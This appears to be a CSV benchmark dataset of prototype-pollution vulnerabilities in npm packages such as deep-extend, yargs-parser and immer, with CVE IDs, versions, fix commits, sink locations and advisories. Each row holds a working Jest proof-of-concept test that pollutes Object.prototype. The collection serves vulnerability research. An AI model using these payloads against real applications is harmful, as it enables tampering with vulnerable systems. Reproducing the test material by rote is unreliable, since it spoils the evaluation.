Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,CVE-2018-3752,merge-options,1.0.0,1.0.1,prototype-pollution/merge-options_1.0.0,"//https://snyk.io/vuln/npm:merge-options:20180415
test(""prototype pollution in merge-options"", () => {
  const merge = require(""merge-options"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/schnittstabil/merge-options/commit/d4a93bc2890455e0931ac0779667023e6cb101d4,index.js:73:16,https://security.snyk.io/vuln/npm:merge-options:20180415; https://github.com/advisories/GHSA-qw93-45r3-p66p
prototype-pollution,CVE-2020-7748,@tsed/core,5.62.3,5.65.7,prototype-pollution/tsed-core_5.62.3,"//https://snyk.io/vuln/SNYK-JS-TSEDCORE-1019382
test(""prototype pollution in @tsed/core"", () => {
  const { deepExtends } = require(""@tsed/core"");

  const payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let result = deepExtends({ security: [{ 1: ""o"" }] }, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/TypedProject/tsed/commit/1395773ddac35926cf058fc6da9fb8e82266761b,core/src/utils/deepExtends.ts:36:15,https://security.snyk.io/vuln/SNYK-JS-TSEDCORE-1019382; https://github.com/advisories/GHSA-77xq-cpvg-7xm2
prototype-pollution,CVE-2018-3750,deep-extend,0.5.0,0.5.1,prototype-pollution/deep-extend_0.5.0,"test(""prototype pollution in merge-objects"", () => {
  const merge = require(""deep-extend"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/unclechu/node-deep-extend/commit/433ee51ed606f4e1867ece57b6ff5a47bebb492f,lib/deep-extend.js:117:17,https://security.snyk.io/vuln/npm:deep-extend:20180409; https://github.com/advisories/GHSA-hr2v-3952-633q
prototype-pollution,CVE-2018-3749,deap,1.0.0,1.0.1,prototype-pollution/deap_1.0.0,"//https://snyk.io/vuln/npm:deap:20180415
test(""prototype pollution in deap"", () => {
  const deap = require(""deap"");
  obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  deap.merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/connie-lang.js:35:28,https://security.snyk.io/vuln/npm:deap:20180415; https://github.com/advisories/GHSA-xrmp-99wj-p6jc
prototype-pollution,CVE-2020-28448,multi-ini,2.1.0,2.1.1,prototype-pollution/multi-ini_2.1.0,"//https://snyk.io/vuln/SNYK-JS-MULTIINI-1048969
test(""prototype pollution in multi-ini"", () => {
  const ini = require(""multi-ini"");
  const path = require(""path"");

  expect({}.polluted).toBe(undefined);

  ini.read(path.resolve(__dirname, ""./payload.toml""), { encoding: ""utf8"" });
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/parser.js:193:38,https://security.snyk.io/vuln/SNYK-JS-MULTIINI-1048969; https://github.com/advisories/GHSA-g78f-549w-c354
prototype-pollution,CVE-2021-23421,merge-change,1.0.1,n/a,prototype-pollution/merge-change_1.0.1,"//
test(""prototype pollution in merge-change"", () => {
  const utils = require(""merge-change"").utils;

  expect({}.polluted).toBe(undefined);

  let obj = {};
  utils.set(obj, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,utils.js:63:26,https://github.com/VladimirShestakov/merge-change/blob/9901f145e06158f284f52de42e6ba5b0f702fb65/utils.js#L89-L123; https://security.snyk.io/vuln/SNYK-JS-MERGECHANGE-1310985
prototype-pollution,CVE-2020-7600,querymen,2.1.3,2.1.4,prototype-pollution/querymen_2.1.3,"//https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867
test(""prototype pollution in querymen"", () => {
  var a = require(""querymen"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  a.handler(""__proto__"", ""polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/diegohaz/querymen/commit/1987fefcb3b7508253a29502a008d5063a873cef,dist/index.js:46:26,https://security.snyk.io/vuln/SNYK-JS-QUERYMEN-559867; https://github.com/advisories/GHSA-2cf2-2383-h4jv
prototype-pollution,CVE-2020-7608,yargs-parser,6.0.0,18.1.1,prototype-pollution/yargs-parser_6.0.0,"//https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381

test(""prototype pollution in yargs-parser"", () => {
  expect({}.polluted).toBe(undefined);

  const parser = require(""yargs-parser"");

  parser(""--foo.__proto__.polluted yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:587:14,https://security.snyk.io/vuln/SNYK-JS-YARGSPARSER-560381; https://github.com/advisories/GHSA-p9pc-299p-vxgp
prototype-pollution,CVE-2021-23436,immer,8.0.0,9.0.6,prototype-pollution/immer_8.0.0,"//https://snyk.io/vuln/SNYK-JS-IMMER-1019369
test(""prototype pollution in immer"", () => {
  expect({}.polluted).toBe(undefined);

  const { applyPatches, enablePatches } = require(""immer"");
  enablePatches();
  applyPatches({}, [
    { op: ""add"", path: [""__proto__"", ""polluted""], value: ""yes"" },
  ]);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237,src/plugins/patches.ts:245:16,https://security.snyk.io/vuln/SNYK-JS-IMMER-1540542; https://github.com/advisories/GHSA-33f9-j839-rf8h
prototype-pollution,CVE-2019-10793,dot-object,2.1.2,2.1.3,prototype-pollution/dot-object_2.1.2,"//https://snyk.io/vuln/SNYK-JS-DOTOBJECT-548905
test(""prototype pollution in dot-object "", () => {
  var a = require(""dot-object"");
  var obj = {};
  var path = ""__proto__"";

  expect({}.polluted).toBe(undefined);

  var val = { polluted: ""yes"" };
  a.set(path, val, {}, true);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/rhalff/dot-object/commit/f76cff5fe6d01d30ce110d8f454db2e5bd28a7de,index.js:415:25,https://security.snyk.io/vuln/SNYK-JS-DOTOBJECT-548905; 
prototype-pollution,CVE-2020-7717,dot-notes,3.2.0,n/a,prototype-pollution/dot-notes_3.2.0,"//https://snyk.io/vuln/SNYK-JS-DOTNOTES-598668
test(""prototype pollution in dot-notes"", () => {
  expect({}.polluted).toBe(undefined);

  const dots = require(""dot-notes"");
  dots.create({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/create.js:43:19,https://security.snyk.io/vuln/SNYK-JS-DOTNOTES-598668; https://github.com/advisories/GHSA-qr4m-jcvc-3382
prototype-pollution,CVE-2020-7726,safe-object2,1.0.3,n/a,prototype-pollution/safe-object2_1.0.3,"//https://snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801
test(""prototype pollution in safe-object2"", () => {
  const safeObj2 = require(""safe-object2"");
  const obj = safeObj2({});

  expect({}.polluted).toBe(undefined);

  obj.setter([""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/index.js:1:1869,https://security.snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801; https://github.com/advisories/GHSA-jpq3-xf27-5jf2
prototype-pollution,CVE-2020-7703,nis-utils,0.6.10,n/a,prototype-pollution/nis-utils_0.6.10,"//https://snyk.io/vuln/SNYK-JS-NISUTILS-598799

test(""prototype pollution in nis-utils"", () => {
  const nisUtils = require(""nis-utils"");

  const object1 = {};
  expect({}.polluted).toBe(undefined);

  nisUtils.object.setValue({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/object.js:166:40,https://security.snyk.io/vuln/SNYK-JS-NISUTILS-598799; https://github.com/advisories/GHSA-gr58-j5wh-m333
prototype-pollution,CVE-2020-7723,promisehelpers,0.0.5,n/a,prototype-pollution/promisehelpers_0.0.5,"//https://snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686
test(""prototype pollution in promisehelpers"", () => {
  const promisehelpers = require(""promisehelpers"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  promisehelpers.insert([""__proto__"", ""polluted""], ""yes"")(obj);
  expect({}.polluted).toBe(""yes"");
});
",n/a,src/index.js:16:25,https://security.snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686; https://github.com/advisories/GHSA-rj5f-7c8x-gjg4
prototype-pollution,CVE-2018-3723,defaults-deep,0.2.0,0.2.4,prototype-pollution/defaults-deep_0.2.0,"//https://hackerone.com/reports/310514
test(""prototype pollution in defaults-deep "", () => {
  const defaultsDeep = require(""defaults-deep"");
  expect({}.polluted).toBe(undefined);

  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  defaultsDeep({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/defaults-deep/commit/c873f341327ad885ff4d0f23b3d3bca31b0343e5,index.js:20:16,https://hackerone.com/reports/310514; https://security.snyk.io/vuln/npm:defaults-deep:20180215; https://github.com/advisories/GHSA-cqp5-m4pq-gfgp
prototype-pollution,CVE-2020-7716,deeps,1.4.5,n/a,prototype-pollution/deeps_1.4.5,"//https://snyk.io/vuln/SNYK-JS-DEEPS-598667
test(""prototype pollution in deeps"", () => {
  expect({}.polluted).toBe(undefined);

  const deeps = require(""deeps"");
  deeps.set({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:226:94,https://security.snyk.io/vuln/SNYK-JS-DEEPS-598667; https://github.com/advisories/GHSA-rgfv-v3jh-7ffp
prototype-pollution,CVE-2020-7618,sds,3.2.0,4.0.0,prototype-pollution/sds_3.2.0,"//https://snyk.io/vuln/SNYK-JS-SDS-564123
test(""prototype pollution in sds"", () => {
  const root = require(""sds"");

  obj = {};
  let payload = ""__proto__.polluted"";

  expect({}.polluted).toBe(undefined);

  root.set({}, payload, true);

  expect({}.polluted).toBe(true);
});
",https://github.com/monsterkodi/sds/commit/a228f025fd1be033088b7abbc0f77118d573f216,js:34:13,https://security.snyk.io/vuln/SNYK-JS-SDS-564123; https://github.com/advisories/GHSA-cxm3-284p-qc4v
prototype-pollution,CVE-2020-7706,connie,0.1.0,0.1.1,prototype-pollution/connie_0.1.0,"test(""prototype pollution in connie"", () => {
  expect({}.polluted).toBe(undefined);

  const connie = require(""connie"");
  const fs = require(""fs"");
  const path = require(""path"");
  const pathToConfig = path.resolve(__dirname, ""./config.json"");

  fs.writeFileSync(pathToConfig, `{""__proto__"": {""polluted"": ""yes""}}`);
  connie(""file"", pathToConfig)
    .read()
    .then(() => {
      expect({}.polluted).toBe(""yes"");
      fs.unlinkSync(pathToConfig);
    });
});
",https://github.com/mattinsler/connie-lang/commit/ef376d404c712dd28309ba07f28a8f87f24a015a,lib/connie-lang.js:43:28,https://security.snyk.io/vuln/SNYK-JS-CONNIELANG-598853; https://github.com/advisories/GHSA-8vv3-jxm8-f4vf
